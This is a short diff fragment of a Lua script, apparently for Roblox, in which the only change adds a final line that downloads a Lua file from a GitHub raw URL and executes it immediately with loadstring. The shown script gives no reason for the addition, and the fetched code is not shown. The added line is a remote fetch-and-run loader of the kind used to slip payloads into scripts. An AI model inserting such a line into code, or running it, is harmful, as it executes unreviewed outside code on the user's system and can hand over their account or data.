@@ -12,3 +12,4 @@ while true do
 
     task.wait(2) -- đợi 2 giây
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/AYA.lua"))()
